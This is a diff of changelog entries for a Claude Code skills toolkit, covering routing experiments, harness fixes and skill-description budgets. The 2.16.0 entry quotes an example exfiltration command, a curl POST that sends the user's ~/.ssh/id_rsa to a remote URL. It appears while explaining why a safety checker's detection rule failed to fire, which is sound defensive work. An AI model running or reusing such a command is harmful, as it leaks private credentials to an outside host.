@@ -1,5 +1,110 @@
 # Changelog
 
+## 2.20.0
+
+**Routing was measured properly, and the measurement talked me out of two thirds of the fix.**
+
+The old 5/10 figure from 2.15.0 came from 10 probes, one sample each, no control. Both flaws mattered.
+`tests/routing/` replaces it with an executable matrix: a fresh `claude -p` per run against the real
+installed listing, outcome read from the actual `Skill` tool call rather than a human watching or the
+model self-reporting.
+
+### 10 probes × 5 reps = 50 runs: **58% first-choice, and zero WRONG**
+
+Not one probe routed to a *different* skill. Every failure was `NONE` — no skill fired at all — which
+killed both leading hypotheses (sibling shadowing, listing-budget truncation handing the win to a
+competitor) in a single measurement. The real competition is Claude Code's **own** behaviour:
+
+- the built-in `code-review` skill beat `review-cluster`;
+- the built-in memory instructions beat `learn` outright — the agent just wrote the memory file itself.
+
+### Fixed: `review-cluster` 1/5 → 5/5
+
+Rewritten from a descriptive `Use when …` to a pushy imperative (`Always load this before reviewing a
+diff — do not review by hand …`), per Anthropic's own guidance that Claude "has a tendency to
+undertrigger skills… make the skill descriptions a little bit 'pushy'." A pushy imperative is not the
+workflow summary Superpowers' A/B test warns about: it says when to load, never what will happen.
+
+### Reverted: the same fix on `schema` and `docs`, because the control said so
+
+It moved `schema` 0/5 → 0/5 and `docs` 0/5 → 1/5. Raising the turn ceiling to 14 ruled out the harness
+as the cause — and made the runs long enough to finish, which finally answered the control question:
+
+- **all 5 unaided `schema` runs caught every hazard** in the fixture migration (the rewrite risk of
+  `ADD COLUMN NOT NULL DEFAULT`, the unbatched full-table `UPDATE`, `NOW()`);
+- **unaided `docs` runs wrote a reasonable sectioned README.**
+
+"If the control doesn't exhibit the failure, there is nothing to fix — stop, don't author the
+guidance." So both were reverted. **A `NONE` is only a defect when the unaided run does the job worse.**
+Dispatch rate was a proxy for outcome quality, and on two of ten probes the proxy disagreed with the
+outcome.
+
+### The lexical proxy gate is gone (23 gates, down from 24)
+
+`tests/score-routing-probes.ts` deleted. It was retired rather than kept alongside because it was
+measurably misleading: it named `secure` as the threat to `review-cluster` when the real competitor was
+a built-in it cannot see. A gate that produces confident wrong guidance is worse than no gate.
+
+### Three harness bugs, all of which had produced wrong numbers
+
+- **Scoring mid-flight** gave 42%, 58% and 17% off overlapping data, because an unfinished run looks
+  exactly like "no skill fired". `score.py` now excludes any run with no terminal `result` event.
+- **A fixture that cannot answer the probe:** `verify` scored 1/5 in a clean checkout and 5/5 once the
+  working tree had real uncommitted changes.
+- **`--max-turns 4`** ended 59 of the first 66 runs in `error_max_turns`, so it is a dispatch-only
+  setting and cannot support any claim about output quality.
+
+### Also
+
+- `check-memory` no longer reports a project path as stale because a sibling memory file resolved. A
+  memory entry cites two namespaces; the single-root guard was defeated by the mix, and it produced a
+  confident P1 about a file that exists.
+
+## 2.19.0
+
+Pushy descriptions for the three skills measured as undertriggering. Superseded within the hour by
+2.20.0, which reverted two of the three on control evidence.
+
+## 2.18.0
+
+**Progressive-disclosure sweep.** `principles` was the worst words-per-load ratio in the library —
+2,774 words pulled in by 29 of the 30 other skills — and is now 1,248 words / 133 lines: the laws only,
+with a routing table pointing at six one-level-deep reference files. Sections §1–§10 were preserved
+deliberately, since siblings cite `§9` six times, `§3` three times, `§5` twice, plus `§2` and `§8`.
+
+`study` −24%, `test` −13%, `evaluate` −10%, `adopt` −6%. Gated by `body-over-500-lines` (P2, Anthropic's
+stated limit) and `no-progressive-disclosure` (P3).
+
+The design rule: an agent that reads only the SKILL.md must still behave correctly. References carry the
+why and the measured numbers, never the rule.
+
+## 2.17.0
+
+**The skill listing is budgeted, and overflow degrades routing silently.** Verified against the Claude
+Code binary rather than the docs: `skillListingBudgetFraction=0.01`, `bytesPerToken=4`,
+`skillListingMaxDescChars=1536`, default context `200_000` — an 8,000-char budget. Overflow drops
+descriptions **starting with the skills you invoke least.**
+
+Measured here: 160 installed skills totalled 62,644 chars (7.8× over); viby-toolkit alone was 15,469 and
+overflowed the listing by itself. **So the intuitive fix — a longer, more explicit description — makes
+mis-routing worse.** Descriptions rewritten as triggers only: 15,469 → 10,261 chars.
+
+Compression has two costs, both caught by this repo's own checkers in one command: shorter descriptions
+are more similar (two new shadowing pairs), and three trigger phrases earlier probes had measured as
+necessary went red when cut. Resolved by a rule worth keeping — **add distinguishing words as triggers,
+never as summaries.**
+
+## 2.16.0
+
+All nine findings from a three-agent review swarm closed. The one that mattered: `check-skill-safety`'s
+flagship exfiltration rule **could never fire on quoted shell** — `curl -X POST "https://…" --data
+"@$HOME/.ssh/id_rsa"` keeps both the URL and the credential path inside quotes, and the blanking pass
+erased both. Also: prose rules never fired outside Markdown, so an injection planted in a `.sh` comment
+was checked by nothing.
+
+Benchmarking the fixes on 2,035 real files then found a tenth thing — every `check-logging` finding was
+inside a file named `logger.mjs`, forwarding the caller's own fields, which is a logger's job.
+
 ## 2.15.0
 
 **Live routing was measured for the first time. It scored 5/10 against an 80% bar — a fail.** That
